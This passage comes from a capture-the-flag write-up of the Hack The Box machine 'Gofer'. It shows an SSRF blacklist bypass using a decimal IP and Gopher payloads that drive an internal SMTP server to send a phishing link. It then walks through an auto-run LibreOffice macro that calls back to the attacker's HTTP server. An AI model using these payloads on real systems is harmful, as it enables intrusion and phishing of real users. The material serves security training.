+<span class="o">&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Directory</span> <span class="n">listing</span> <span class="k">for</span> <span class="o">/&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">hr</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">ul</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">li</span><span class="o">&gt;&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">"extensions.txt"</span><span class="o">&gt;</span><span class="n">extensions</span><span class="o">.</span><span class="n">txt</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;/</span><span class="n">li</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">ul</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">hr</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="mi">1</span>
+</pre></div>
+
+It's executing the request specified in the URL parameter, and I've received the GET request on my Python HTTP Server:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">12</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="s2">"GET / HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
+</pre></div>
+<h3><br>SSRF</br></h3><br>
+Given that we can specify the URL for the machine to request, let's attempt to access an internal service on the victim machine that's not externally accessible.<br/><br/>
+For instance, let's try to access the webpage hosted on port 80 on the local machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=http://127.0.0.1'</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;</span><span class="n">Blacklisted</span> <span class="n">keyword</span><span class="p">:</span> <span class="o">/</span><span class="mi">127</span> <span class="err">!</span><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;%</span>
+</pre></div>
+
+It appears there might be security measures in place to prevent SSRF. It seems to be checking for blacklisted words in the specified URL. We can attempt to bypass this restriction by using different phrasing. <br/><br/>
+Let's try accessing using <code>localhost</code> instead of <code>127.0.0.1</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=http://localhost'</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;</span><span class="n">Blacklisted</span> <span class="n">keyword</span><span class="p">:</span> <span class="n">localhost</span> <span class="err">!</span><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;%</span>
+</pre></div>
+
+It's displaying an error as well. Let's explore techniques for bypassing blacklist words by referring to external resources, specifically looking at a method mentioned in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#bypass-using-a-decimal-ip-location">PayloadsAllTheThings</a> that involves using a decimal IP location. The equivalent of <code>127.0.0.1</code> in decimal is <code>2130706433</code>. Let's try this in the URL.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=http://2130706433'</span>
+
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">HTML</span> <span class="n">PUBLIC</span> <span class="s2">"-//IETF//DTD HTML 2.0//EN"</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="mi">400</span> <span class="n">Bad</span> <span class="n">Request</span><span class="o">&lt;/</span><span class="n">title</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">head</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">Bad</span> <span class="n">Request</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Your</span> <span class="n">browser</span> <span class="n">sent</span> <span class="n">a</span> <span class="n">request</span> <span class="n">that</span> <span class="n">this</span> <span class="n">server</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">understand</span><span class="o">.&lt;</span><span class="n">br</span> <span class="o">/&gt;</span>
+<span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">hr</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">address</span><span class="o">&gt;</span><span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.56</span> <span class="p">(</span><span class="n">Debian</span><span class="p">)</span> <span class="n">Server</span> <span class="n">at</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="n">Port</span> <span class="mi">80</span><span class="o">&lt;/</span><span class="n">address</span><span class="o">&gt;</span>
+<span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</pre></div>
+
+This yields a different output, indicating a potential successful bypass of the blacklist words security implementation.<br/><br/>
+<h3><br>Shell as jhudson</br></h3><br>
+It's evident at this stage that the machine's name becomes pivotal for this exploitation. Confirming that an Email Service is operating on port 25 on the victim machine (as indicated by the email from <code>jdavis@gofer.htb</code>), which highlighted a phishing attack that impacted the user Jocelyn. Jocelyn fell victim to this attack by clicking on a link without recognizing its source.<br/><br/>
+Our current strategy involves leveraging SSRF to send an email to the user Jocelyn, containing a malevolent link that directs to our attacker's machine. This link should prompt the download of a file with an ODT extension. ODT files are essentially text files used by the LibreOffice program. These file types enable the addition of macros containing malicious content, capable of executing undesired instructions on the system.<br/><br/>
+To send the email, we first need to determine the email of the user Jocelyn, which, judging by the structure of the email we've read, appears to be composed of the initial of the name and their last name.<br/><br/>
+In the "Team" section of the victim machine's main page, specifically on <code>gofer.htb</code>, we can view the names and last names of users that seem to be part of the team.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/3.png"/><br/><br/>
+We managed to see the name "Jocelyn Hudson," which could belong to the user to whom we need to send the malicious email. First, let's adjust the name to fit the email format: <code>jhudson@gofer.htb</code>.<br/><br/>
+<h3><br>SSRF - Gopher</br></h3><br>
+There are some techniques to communicate with internal services when exploiting an SSRF, and in our case, we're going to use Gopher.<br/><br/>
+<em>"Using this protocol you can specify the </em><em>IP, port and bytes</em><em> you want the server to </em><em>send</em><em>. Then, you can basically exploit a SSRF to </em><em>communicate with any TCP server</em><em> (but you need to know how to talk to the service first)."</em><br/><br/>
+<em><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher">HackTricks - SSRF</a></em><br/><br/>
+In HackTricks, there's an example payload to connect to an SMTP Server by exploiting an SSRF using Gopher://<br/><br/>
+<div class="highlight"><pre><span></span>gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+</pre></div>
+
+Now we're going to conduct some tests, but first, we need to make slight modifications to this payload. Given its length, we must handle the modifications carefully.<br/><br/>
+Initially, I'm going to attempt using this payload without any modification. Let's send the request to the victim machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=gopher://127.0.0.1:25/xHELO</span><span class="si">%20lo</span><span class="s1">calhost</span><span class="si">%250d%250a</span><span class="s1">MAIL</span><span class="si">%20F</span><span class="s1">ROM%3A%3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">RCPT%20TO%3A%3Cvictim@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">DATA</span><span class="si">%250d%250a</span><span class="s1">From%3A</span><span class="si">%20%</span><span class="s1">5BHacker%5D</span><span class="si">%20%</span><span class="s1">3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">To%3A</span><span class="si">%20%</span><span class="s1">3Cvictime@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">Date%3A%20Tue%2C</span><span class="si">%2015%</span><span class="s1">20Sep</span><span class="si">%202017%</span><span class="s1">2017%3A20%3A26%20-0400</span><span class="si">%250d%250a</span><span class="s1">Subject%3A%20AH%20AH%20AH</span><span class="si">%250d%250a%250d%250a</span><span class="s1">You</span><span class="si">%20d</span><span class="s1">idn%27t</span><span class="si">%20s</span><span class="s1">ay%20the%20magic%20word</span><span class="si">%20%</span><span class="s1">21</span><span class="si">%250d%250a%250d%250a%250d%250a</span><span class="s1">.</span><span class="si">%250d%250a</span><span class="s1">QUIT</span><span class="si">%250d%250a</span><span class="s1">'</span>
+
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;</span><span class="n">Blacklisted</span> <span class="n">keyword</span><span class="p">:</span> <span class="n">localhost</span> <span class="err">!</span><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
+</pre></div>
+
+It's generating an error due to the usage of blacklisted words. Firstly, I'll replace the strings <code>127.0.0.1</code> and <code>localhost</code> with <code>2130706433</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">payload</span> <span class="o">|</span> <span class="n">sed</span> <span class="s1">'s/127\.0\.0\.1/2130706433/'</span> <span class="o">|</span> <span class="n">sed</span> <span class="s1">'s/localhost/2130706433/'</span> <span class="o">|</span> <span class="n">sponge</span> <span class="n">payload</span>
+</pre></div>
+
+Now, I'll copy the modified payload and proceed to send it:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO</span><span class="si">%202130706433%</span><span class="s1">250d</span><span class="si">%250a</span><span class="s1">MAIL</span><span class="si">%20F</span><span class="s1">ROM%3A%3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">RCPT%20TO%3A%3Cvictim@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">DATA</span><span class="si">%250d%250a</span><span class="s1">From%3A</span><span class="si">%20%</span><span class="s1">5BHacker%5D</span><span class="si">%20%</span><span class="s1">3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">To%3A</span><span class="si">%20%</span><span class="s1">3Cvictime@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">Date%3A%20Tue%2C</span><span class="si">%2015%</span><span class="s1">20Sep</span><span class="si">%202017%</span><span class="s1">2017%3A20%3A26%20-0400</span><span class="si">%250d%250a</span><span class="s1">Subject%3A%20AH%20AH%20AH</span><span class="si">%250d%250a%250d%250a</span><span class="s1">You</span><span class="si">%20d</span><span class="s1">idn%27t</span><span class="si">%20s</span><span class="s1">ay%20the%20magic%20word</span><span class="si">%20%</span><span class="s1">21</span><span class="si">%250d%250a%250d%250a%250d%250a</span><span class="s1">.</span><span class="si">%250d%250a</span><span class="s1">QUIT</span><span class="si">%250d%250a</span><span class="s1">'</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="mi">220</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="n">ESMTP</span> <span class="n">Postfix</span> <span class="p">(</span><span class="n">Debian</span><span class="o">/</span><span class="n">GNU</span><span class="p">)</span>
+<span class="mi">250</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+<span class="mi">250</span> <span class="mf">2.1.0</span> <span class="n">Ok</span>
+<span class="mi">550</span> <span class="mf">5.1.1</span> <span class="o">&lt;</span><span class="n">victim</span><span class="nd">@site</span><span class="o">.</span><span class="n">com</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">Recipient</span> <span class="n">address</span> <span class="n">rejected</span><span class="p">:</span> <span class="mf">127.0.0.1</span>
+<span class="mi">554</span> <span class="mf">5.5.1</span> <span class="n">Error</span><span class="p">:</span> <span class="n">no</span> <span class="n">valid</span> <span class="n">recipients</span>
+<span class="mi">221</span> <span class="mf">2.7.0</span> <span class="n">Error</span><span class="p">:</span> <span class="n">I</span> <span class="n">can</span> <span class="k">break</span> <span class="n">rules</span><span class="p">,</span> <span class="n">too</span><span class="o">.</span> <span class="n">Goodbye</span><span class="o">.</span>
+</pre></div>
+
+It's providing a different output, and we can observe that we're interacting with PostFix. This confirms our successful exploitation of the SSRF to interact with the SMTP service!<br/><br/>
+Now, let's modify the payload to send the email to <code>jhudson@gofer.htb</code> and include a link pointing to my HTTP Server. Upon clicking the link, we'll receive a GET request on our HTTP Server.<br/><br/>
+The only modification needed is in the RCPT mail:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">cat</span> <span class="n">payload</span> <span class="o">|</span> <span class="n">sed</span> <span class="s1">'s/victim@site.com/jhudson@gofer.htb/'</span> <span class="o">|</span> <span class="n">sed</span> <span class="s1">'s/victime@site.com/jhudson@gofer.htb/'</span> <span class="o">|</span> <span class="n">sponge</span> <span class="n">payload</span>
+</pre></div>
+
+I'll also modify the message content to include the URL pointing to our HTTP Server.<br/><br/>
+<div class="highlight"><pre><span></span>gopher://2130706433:25/xHELO%202130706433%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250ahttp://10.10.16.7/PWNED%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
+</pre></div>
+
+Before sending the new payload, I'll set up an HTTP Server:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+</pre></div>
+
+Now, let's send the payload:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO</span><span class="si">%202130706433%</span><span class="s1">250d</span><span class="si">%250a</span><span class="s1">MAIL</span><span class="si">%20F</span><span class="s1">ROM%3A%3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">RCPT%20TO%3A%3Cjhudson@gofer.htb</span><span class="si">%3E%250d%250a</span><span class="s1">DATA</span><span class="si">%250d%250a</span><span class="s1">From%3A</span><span class="si">%20%</span><span class="s1">5BHacker%5D</span><span class="si">%20%</span><span class="s1">3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">To%3A</span><span class="si">%20%</span><span class="s1">3Cjhudson@gofer.htb</span><span class="si">%3E%250d%250a</span><span class="s1">Date%3A%20Tue%2C</span><span class="si">%2015%</span><span class="s1">20Sep</span><span class="si">%202017%</span><span class="s1">2017%3A20%3A26%20-0400</span><span class="si">%250d%250a</span><span class="s1">Subject%3A%20AH%20AH%20AH</span><span class="si">%250d%250a%250d%250a</span><span class="s1">http://10.10.16.7/PWNED</span><span class="si">%20%</span><span class="s1">21</span><span class="si">%250d%250a%250d%250a%250d%250a</span><span class="s1">.</span><span class="si">%250d%250a</span><span class="s1">QUIT</span><span class="si">%250d%250a</span><span class="s1">'</span>
+
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="mi">220</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="n">ESMTP</span> <span class="n">Postfix</span> <span class="p">(</span><span class="n">Debian</span><span class="o">/</span><span class="n">GNU</span><span class="p">)</span>
+<span class="mi">250</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+<span class="mi">250</span> <span class="mf">2.1.0</span> <span class="n">Ok</span>
+<span class="mi">250</span> <span class="mf">2.1.5</span> <span class="n">Ok</span>
+<span class="mi">354</span> <span class="n">End</span> <span class="n">data</span> <span class="k">with</span> <span class="o">&lt;</span><span class="n">CR</span><span class="o">&gt;&lt;</span><span class="n">LF</span><span class="o">&gt;.&lt;</span><span class="n">CR</span><span class="o">&gt;&lt;</span><span class="n">LF</span><span class="o">&gt;</span>
+<span class="mi">250</span> <span class="mf">2.0.0</span> <span class="n">Ok</span><span class="p">:</span> <span class="n">queued</span> <span class="k">as</span> <span class="mi">45</span><span class="n">C1A8140</span>
+<span class="mi">221</span> <span class="mf">2.0.0</span> <span class="n">Bye</span>
+</pre></div>
+
+After waiting for about a minute, I received a GET request from the victim machine to my HTTP server.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="n">code</span> <span class="mi">404</span><span class="p">,</span> <span class="n">message</span> <span class="n">File</span> <span class="ow">not</span> <span class="n">found</span>
+<span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">21</span><span class="p">]</span> <span class="s2">"GET /PWNED HTTP/1.1"</span> <span class="mi">404</span> <span class="o">-</span>
+</pre></div>
+
+The user <code>jhudson</code> is indeed clicking on the links I send her in the email content.<br/><br/>
+With this knowledge, we now need to create a malicious file that we will offer via an HTTP server on our victim machine. This will be the file the user in question will need to download and subsequently execute.<br/><br/>
+First, let's generate a Writer document using LibreOffice.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/4.png"/><br/><br/>
+Now, let's navigate to the macros section.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/5.png"/><br/><br/>
+Click on <code>Edit Macros</code>, then proceed to create a new one.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/6.png"/><br/><br/>
+Next, we need to insert the malicious content into the <code>Malicious</code> macro.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/7.png"/><br/><br/>
+As part of this test, we will utilize the <code>Shell()</code> function to execute commands on the victim machine. In this instance, we'll initiate a curl request to our HTTP Server.<br/><br/>
+Upon running the macro, the output will resemble the following:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.16.7</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="n">code</span> <span class="mi">404</span><span class="p">,</span> <span class="n">message</span> <span class="n">File</span> <span class="ow">not</span> <span class="n">found</span>
+<span class="mf">10.10.16.7</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">14</span><span class="p">]</span> <span class="s2">"GET /ThisWasExecuted HTTP/1.1"</span> <span class="mi">404</span> <span class="o">-</span>
+</pre></div>
+
+Before saving the file, it's crucial to ensure that the macro runs upon opening the document; otherwise, the macro won't execute at any point.<br/><br/>
+To configure this, we need to click on Tools -&gt; Macros -&gt; Organize Macros -&gt; Basic:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/13.png"/><br/><br/>
+We need to click on <code>Assign</code>.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/14.png"/><br/><br/>
+We navigate to the <code>Events</code> section.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/15.png"/><br/><br/>
+Click on <code>Open Document</code> and select the respective macro.<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/hard/gofer/img/16.png"/><br/><br/>
+Once the file is saved, the macro will execute the specified command when the document is reopened.<br/><br/>
+Now, we need to host the file on a web server. When the user <code>jhudson</code> clicks the link, the file will be downloaded and, assuming <code>jhudson</code> opens the file upon download, it will execute the malicious content.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">curl</span> <span class="o">-</span><span class="n">s</span> <span class="o">-</span><span class="n">X</span> <span class="n">POST</span> <span class="s1">'http://proxy.gofer.htb/index.php?url=gopher://2130706433:25/xHELO</span><span class="si">%202130706433%</span><span class="s1">250d</span><span class="si">%250a</span><span class="s1">MAIL</span><span class="si">%20F</span><span class="s1">ROM%3A%3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">RCPT%20TO%3A%3Cjhudson@gofer.htb</span><span class="si">%3E%250d%250a</span><span class="s1">DATA</span><span class="si">%250d%250a</span><span class="s1">From%3A</span><span class="si">%20%</span><span class="s1">5BHacker%5D</span><span class="si">%20%</span><span class="s1">3Chacker@site.com</span><span class="si">%3E%250d%250a</span><span class="s1">To%3A</span><span class="si">%20%</span><span class="s1">3Cjhudson@gofer.htb</span><span class="si">%3E%250d%250a</span><span class="s1">Date%3A%20Tue%2C</span><span class="si">%2015%</span><span class="s1">20Sep</span><span class="si">%202017%</span><span class="s1">2017%3A20%3A26%20-0400</span><span class="si">%250d%250a</span><span class="s1">Subject%3A%20AH%20AH%20AH</span><span class="si">%250d%250a%250d%250a</span><span class="s1">http://10.10.16.7/pwned.odt</span><span class="si">%20%</span><span class="s1">21</span><span class="si">%250d%250a%250d%250a%250d%250a</span><span class="s1">.</span><span class="si">%250d%250a</span><span class="s1">QUIT</span><span class="si">%250d%250a</span><span class="s1">'</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="o">--</span> <span class="n">Welcome</span> <span class="n">to</span> <span class="n">Gofer</span> <span class="n">proxy</span> <span class="o">--&gt;</span>
+<span class="mi">220</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span> <span class="n">ESMTP</span> <span class="n">Postfix</span> <span class="p">(</span><span class="n">Debian</span><span class="o">/</span><span class="n">GNU</span><span class="p">)</span>
+<span class="mi">250</span> <span class="n">gofer</span><span class="o">.</span><span class="n">htb</span>
+<span class="mi">250</span> <span class="mf">2.1.0</span> <span class="n">Ok</span>
+<span class="mi">250</span> <span class="mf">2.1.5</span> <span class="n">Ok</span>
+<span class="mi">354</span> <span class="n">End</span> <span class="n">data</span> <span class="k">with</span> <span class="o">&lt;</span><span class="n">CR</span><span class="o">&gt;&lt;</span><span class="n">LF</span><span class="o">&gt;.&lt;</span><span class="n">CR</span><span class="o">&gt;&lt;</span><span class="n">LF</span><span class="o">&gt;</span>
+<span class="mi">250</span> <span class="mf">2.0.0</span> <span class="n">Ok</span><span class="p">:</span> <span class="n">queued</span> <span class="k">as</span> <span class="mi">1365366</span><span class="n">EF</span>
+<span class="mi">221</span> <span class="mf">2.0.0</span> <span class="n">Bye</span>
+<span class="mi">1</span><span class="o">%</span>
+</pre></div>
+
+We've successfully sent the email, and now we wait for the user <code>jhudson</code> to click the link included in the email's content. <br/><br/>
+After a while, the user has downloaded and opened the file.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.11.225</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">28</span><span class="o">/</span><span class="n">Oct</span><span class="o">/</span><span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">42</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span> <span class="s2">"GET /pwned.odt HTTP/1.1"</span> <span class="mi">200</span> <span class="o">-</span>
